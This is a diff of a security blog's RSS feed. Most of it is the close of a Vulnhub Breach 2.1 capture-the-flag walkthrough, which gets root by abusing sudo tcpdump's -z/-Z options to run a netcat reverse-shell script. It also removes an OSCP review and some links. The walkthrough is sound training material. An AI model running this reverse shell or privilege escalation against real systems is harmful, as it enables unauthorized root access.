+&lt;/figure&gt;
+
+
+
+&lt;p&gt;So the user blumbergh can execute tcpdump.
+Trying to get tcpdump running in order to capture some packets did not work.
+RTFM, there might be some feature that I missed up until now.
+The manpages do in fact list one option that could help in this precarious situation.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-1_5.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The manpage for tcpdump helped.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-1_5.png&#34; alt=&#34;The manpage for tcpdump helped.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;So, running tcpdump with this option will execute any command with root privileges.
+The easiest way is to utilize netcat on the target system, as it supports the execute function.
+Before starting the connection a listener has to be opened on the attcker machine.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;quot;nc 192.168.110.5 1234 -e /bin/bash&amp;quot;&lt;/span&gt; &amp;gt; /tmp/con.sh
+$ chmod +x /tmp/con.sh
+$ sudo tcpdump -ln -i eth0 -w /dev/null -W &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -G &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; -z /tmp/con.sh -Z root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The script is executed and netcat connects to the attacking machine.&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-2_0.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Root access to the system.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-2_0.png&#34; alt=&#34;Root access to the system.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;With root rights on the box let&amp;rsquo;s first start a fancy tty shell.
+The root user&amp;rsquo;s home directory has got a &amp;ldquo;hidden&amp;rdquo; flag.py file inside.
+Executing the python script outputs the credits for Breach 2.1.
+Win!&lt;/p&gt;
+
+
+
+&lt;figure class=&#34;fcenter fmedium&#34;&gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-2_1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The flag.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2017/vulnhub-breach-2_1/stage3-2_1.png&#34; alt=&#34;The flag.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;h1 id=&#34;links&#34;&gt;Links&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/breach-21,159/&#34;&gt;Breach 2.1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Vulnhub - Breach 1.0 boot2root CTF walkthrough</title>
+      <link>http://camelinc.info/blog/2017/03/Vulnhub---Breach-1.0-boot2root-CTF-walkthrough/</link>
       <pubDate>Thu, 02 Mar 2017 10:46:59 +0000</pubDate>
       <author>admin@camelinc.de</author>
-      <guid>http://camelinc.info/blog/2017/03/Vulnhub---Breach-1-boot2root-CTF-walkthrough/</guid>
+      <guid>http://camelinc.info/blog/2017/03/Vulnhub---Breach-1.0-boot2root-CTF-walkthrough/</guid>
       <description>
 
 &lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
@@ -604,8 +1106,6 @@ The script is run during startup and boom you have won.&lt;/p&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/breach-1,152/&#34;&gt;Breach: 1&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;magnet:?xt=urn:btih:E1866D3F2433DD0A3EC022FEA0A2EBF0F03060E2&amp;amp;dn=Breach-1.0.zip&amp;amp;tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&amp;amp;tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&amp;amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&amp;amp;tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&amp;amp;tr=udp%3A%2F%2Ftracker.istole.it%3A6969&#34;&gt;Magnet Link&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://docs.twosevenzero.com/2016/06/27/breach-1-0/&#34;&gt;BREACH 1.0 Walkthrough&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
@@ -6017,79 +6517,6 @@ The final command to exploit the vulnerability is as follows.&lt;/p&gt;
 &lt;li&gt;&lt;a href=&#34;http://www.tenouk.com/cncplusplusbufferoverflow.html&#34;&gt;Tenouk&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://pubs.opengroup.org/onlinepubs/009695399/functions/strdup.html&#34;&gt;strdup&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://unix.stackexchange.com/questions/15531/how-come-no-core-dump-is-create-when-an-application-has-suid-set&#34;&gt;Core dump suid binaries&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Offensive Security Certified Professional</title>
-      <link>http://camelinc.info/blog/2014/05/Offensive-Security-Certified-Professional/</link>
-      <pubDate>Wed, 28 May 2014 14:14:46 +0000</pubDate>
-      <author>admin@camelinc.de</author>
-      <guid>http://camelinc.info/blog/2014/05/Offensive-Security-Certified-Professional/</guid>
-      <description>
-
-&lt;h1 id=&#34;intro&#34;&gt;Intro&lt;/h1&gt;
-
-&lt;p&gt;Try Harder!
-If received my OSCP exam in the mail today.
-Time to write a short review.&lt;/p&gt;
-
-&lt;p&gt;As I did not know what to expect from this certification I booked the 90 days lab access.
-Also, I wanted to finish all the exercises and compromise as many systems as possible.
-Up until I received the learning material and the VPN connection to the lab was established I only knew little what to expect.&lt;/p&gt;
-
-&lt;p&gt;The exercises were quite easy, as they try to establish a baseline knowledge of tools and methods.
-The later exercises go more into detail of security.&lt;/p&gt;
-
-&lt;h1 id=&#34;the-lab&#34;&gt;The Lab&lt;/h1&gt;
-
-&lt;p&gt;The really interessting stuff was going on in the labs.
-There are about 50 boxes distributed in a few separate network segments.
-Every time I gained root access on a machine it felt like christmas.
-Every time I gained access to another subnet it felt like christmas, with all the new targets to attack.
-After the 90 days of lab access and a lot of hard work I was only missing access to 6 boxes.
-At this point, my lab report was about 50 pages.
-Luckily, I already had created a latex template, that I could also use for the exam.
-So I thought it was better to move on the actual exam.&lt;/p&gt;
-
-&lt;p&gt;The take aways from the lab was to Try Harder.
-With enough work and some thinking, most boxes can be rooted quite easily.
-There might also be other students working on the same machine.
-Compiling stand alone exploits and having them ready at hand is also quite handy sometimes.
-Also, it was important not to rely on one single exploit, but to try different ways of exploiting a system.&lt;/p&gt;
-
-&lt;h1 id=&#34;the-exam&#34;&gt;The Exam&lt;/h1&gt;
-
-&lt;p&gt;The exam is limited to 24 hours of hacking.
-Subsequently, in 24 extra hours you have to hand in the exam report.
-All the details for the exam will land in your mailbox when the scheduled exam starts.
-Of course, you will have to take over a certain amount of machines.
-This hands on exam is what distinguishes the OSCP from other exams.&lt;/p&gt;
-
-&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
-
-&lt;p&gt;The Offensive Security Certified Professional is a great basis for anybody interested in information security.
-Your skill level does not play a big role.
-If you are new in this area there will be quite a steep learning curve.
-For the more advanced, the lab has ample opportunities to test and improve your security knowledge.
-The most important thing to bring along is a the motivation to learn and understand new things.
-I will Try Harder!&lt;/p&gt;
-
-
-
-&lt;figure class=&#34;fcenter fsmall&#34;&gt;
-    &lt;a href=&#34;http://camelinc.info/img/post/2014/oscp/01-oscp-certs.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Try Harder!&#34; &gt;
-        &lt;img src=&#34;http://camelinc.info/img/post/2014/oscp/01-oscp-certs.png&#34; alt=&#34;Try Harder!&#34; &gt;
-    &lt;/a&gt;
-&lt;/figure&gt;
-
-
-
-&lt;h1 id=&#34;resurces&#34;&gt;Resurces&lt;/h1&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&#34;&gt;Offensive Security Certified Professional (OSCP) Certification&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
